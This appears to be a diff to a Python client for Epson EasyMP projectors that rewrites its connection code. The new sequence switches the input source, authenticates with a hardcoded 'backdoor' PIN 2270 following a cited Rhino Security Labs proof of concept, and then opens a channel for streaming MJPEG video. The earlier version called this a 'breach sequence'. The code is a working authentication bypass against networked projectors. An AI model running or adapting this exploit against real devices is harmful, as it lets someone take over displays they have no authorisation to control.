@@ -4,117 +4,123 @@ import struct
 from . import config
 from . import payloads
 
+class ProtocolError(Exception):
+    pass
+
 class EpsonEasyMPClient:
     def __init__(self, projector_ip=None, my_ip=None):
         self.projector_ip = projector_ip or config.PROJECTOR_IP
         self.my_ip = my_ip or config.get_local_ip()
         
         # Sockets
-        self.s_control = None
-        self.s_video = None
-        self.s_wake = None
-        
-        # Payloads
-        self.payload_control_p1_part1 = payloads.get_control_payload(self.my_ip)
-        self.payload_control_p1_part2 = payloads.get_control_payload_phase_1_part_2(self.my_ip)
-        self.payload_control_p2 = payloads.get_control_payload_phase_2(self.my_ip, self.projector_ip)
-        
-        self.payload_video = payloads.get_video_payload(self.my_ip)
-        self.payload_wakeup = payloads.get_wakeup_payload()
+        self.s_hardware = None # Port 3629
+        self.s_auth = None     # Port 3620
+        self.s_video = None    # Port 3621
     
     def connect_and_negotiate(self):
-        """Executes the full Epson EasyMP state-machine breach sequence."""
-        print(f"[*] Starting negotiation sequence with {self.projector_ip}...")
+        """Executes the deterministic state-machine based connect sequence."""
+        print(f"[*] Starting deterministic negotiation sequence with {self.projector_ip}...")
         
         try:
-            # --- STAGE 1: Control Channel (Phase 1) ---
-            print(f"[*] 1. Opening Control Channel (Port {config.PORT_CONTROL}) Phase 1...")
-            self.s_control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.s_control.settimeout(5)
-            self.s_control.connect((self.projector_ip, config.PORT_CONTROL))
+            # 1. Hardware Control Connect (TCP 3629)
+            try:
+                self._switch_hardware_source()
+            except Exception as e:
+                print(f"[-]    Warning: Hardware control channel (3629) failed ({e}). Skipping to Auth.")
             
-            # Send 68 bytes
-            self.s_control.send(self.payload_control_p1_part1)
-            time.sleep(0.01)
+            # 2. Authentication Connect (TCP 3620)
+            self._authenticate_session()
             
-            # Send 94 bytes immediately after
-            print("[*] 1b. Sending Control Phase 1 Part 2 (94 bytes)...")
-            self.s_control.send(self.payload_control_p1_part2)
+            # 3. Transport Stream Connect (TCP 3621)
+            self._open_video_channel()
             
-            # Wireshark Frame 42: Projector replies with 226 bytes
-            p1_resp = self.s_control.recv(1024)
-            print(f"[+] Received Phase 1 Response (Length: {len(p1_resp)})")
-            
-            # Wireshark Frame 44: Host closes 3620
-            print("[*] 1c. Closing Control Channel (Phase 1)...")
-            self.s_control.close()
-            self.s_control = None # Free the reference for Phase 2
-            
-            time.sleep(0.05)
-            
-            # --- STAGE 2: Video Channel ---
-            print(f"[*] 2. Opening Video Channel (Port {config.PORT_VIDEO})...")
-            self.s_video = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.s_video.settimeout(5)
-            self.s_video.connect((self.projector_ip, config.PORT_VIDEO))
-            self.s_video.send(self.payload_video)
-            
-            time.sleep(1.0) # Projector OS buffer allocation
-            
-            # --- STAGE 3: Wake/Trigger ---
-            print(f"[*] 3. Firing State Trigger (Port {config.PORT_WAKE})...")
-            self.s_wake = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.s_wake.settimeout(5)
-            self.s_wake.connect((self.projector_ip, config.PORT_WAKE))
-            self.s_wake.send(self.payload_wakeup)
-            
-            trigger_resp = self.s_wake.recv(1024)
-            print(f"[+] Trigger acknowledged: {trigger_resp[:10]}")
-            
-            # --- STAGE 4: Force State Progression ---
-            print(f"[*] 4. Closing Port {config.PORT_WAKE} to force progression...")
-            
-            # Send TCP RST instead of FIN (Linger Time = 0)
-            l_onoff = 1
-            l_linger = 0
-            self.s_wake.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))
-            
-            self.s_wake.close()
-            
-            # Wireshark Frame 70: Exactly 1 second delay before Phase 2.
-            time.sleep(1.0) 
-            
-            # --- STAGE 5: Final Negotiation (Phase 2) ---
-            print(f"[*] 5. Reopening Control Channel (Port {config.PORT_CONTROL}) Phase 2...")
-            self.s_control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.s_control.settimeout(5)
-            self.s_control.connect((self.projector_ip, config.PORT_CONTROL))
-            
-            print("[*] 5b. Sending Control Phase 2 (264 bytes)...")
-            self.s_control.send(self.payload_control_p2)
-            
-            final_resp = self.s_control.recv(1024)
-            if final_resp:
-                print("\n[+] BINGO! Connection Fully Established!")
-                print(f"    Params received (Length {len(final_resp)}): {final_resp.hex()[:60]}...")
-                return True
-            else:
-                print("[-] Protocol failure. Projector stayed silent.")
-                return False
+            print("\n[+] BINGO! Connection Fully Established and Ready for Video Stream!")
+            return True
                 
         except Exception as e:
             print(f"[-] Negotiation failed: {e}")
             self.disconnect()
             return False
 
-    def send_video_frame(self, frame_payload):
-        """Sends encrypted frame data to Port 3621."""
+    def _switch_hardware_source(self):
+        print(f"[*] 1. Opening Hardware Control Channel (Port 3629)...")
+        self.s_hardware = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s_hardware.settimeout(5)
+        self.s_hardware.connect((self.projector_ip, config.PORT_WAKE))
+        
+        # ASCII command to switch source to LAN/EasyMP
+        cmd = b"SOURCE 30\r"
+        print(f"[*]    Sending command: {cmd}")
+        self.s_hardware.send(cmd)
+        
+        resp = self.s_hardware.recv(1024)
+        print(f"[+]    Hardware response: {resp}")
+        
+        # Wait for either colon ':' response or just assume success if no crash
+        if b':' not in resp:
+            print("[-]    Warning: Did not see ':' prompt in hardware response.")
+            
+        # The dossier says to leave it open to query state, but we can close it or keep it open.
+        # Let's keep it open in self.s_hardware
+
+    def _authenticate_session(self):
+        print(f"[*] 2. Opening Authentication Channel (Port 3620)...")
+        self.s_auth = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s_auth.settimeout(5)
+        self.s_auth.connect((self.projector_ip, config.PORT_CONTROL))
+        
+        # Get backdoor payload
+        auth_payload = payloads.get_auth_payload(pin="2270")
+        print(f"[*]    Sending Auth Request (Backdoor PIN 2270), length={len(auth_payload)}")
+        self.s_auth.sendall(auth_payload)
+        
+        # Read exactly 52 bytes or at least 52 bytes
+        # Some times read() just returns whatever is available, let's read iteratively if needed, or just up to 64
+        response = bytearray()
+        # Dossier says: "must read exactly 52 bytes into a buffer" or at least check 51st byte
+        # Wait up to a second for data
+        data = self.s_auth.recv(1024)
+        response.extend(data)
+        
+        print(f"[+]    Auth response length: {len(response)} bytes")
+        if len(response) <= 50:
+            raise ProtocolError(f"Auth response too short: {len(response)} bytes")
+            
+        # The Rhino Security Labs PoC validates by hexlifying and checking index 50
+        import binascii
+        resp_hex = binascii.hexlify(data).decode('ascii')
+        
+        if len(resp_hex) > 50:
+            auth_flag = resp_hex[50]
+            print(f"[*]    Auth flag (50th hex char): {auth_flag}")
+            
+            if auth_flag != "0":
+                print("[+]    Authentication SUCCEEDED!")
+            else:
+                raise ProtocolError(f"Authentication REJECTED or failed. 50th hex char is '0'. Response: {resp_hex}")
+        else:
+            raise ProtocolError(f"Authentication response too short: {len(resp_hex)} hex characters")
+
+    def _open_video_channel(self):
+        print(f"[*] 3. Opening Video Channel (Port 3621)...")
+        time.sleep(0.5) # Slight delay purely to let Projector OS transition state
+        self.s_video = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s_video.settimeout(5)
+        self.s_video.connect((self.projector_ip, config.PORT_VIDEO))
+        print("[+]    Video Channel OPEN. Ready to stream PCON-wrapped MJPEG.")
+
+    def send_video_frame(self, x_offset, y_offset, width, height, mjpeg_bytes):
+        """Wraps MJPEG stream data in PCON header and sends to Port 3621."""
         if not self.s_video:
             print("[-] Cannot send video frame. Video socket not initialized!")
             return False
             
         try:
-            self.s_video.sendall(frame_payload)
+            # Construct PCON header
+            pcon_header = payloads.get_pcon_video_header(x_offset, y_offset, width, height, len(mjpeg_bytes))
+            
+            # Send synchronously
+            self.s_video.sendall(pcon_header + mjpeg_bytes)
             return True
         except Exception as e:
             print(f"[-] Stream interrupted: {e}")
@@ -123,12 +129,12 @@ class EpsonEasyMPClient:
     def disconnect(self):
         """Tears down all connections safely."""
         print("[*] Disconnecting client...")
-        if self.s_control:
-            try: self.s_control.close()
+        if self.s_hardware:
+            try: self.s_hardware.close()
+            except: pass
+        if self.s_auth:
+            try: self.s_auth.close()
             except: pass
         if self.s_video:
             try: self.s_video.close()
-            except: pass
-        if self.s_wake:
-            try: self.s_wake.close()
             except: pass
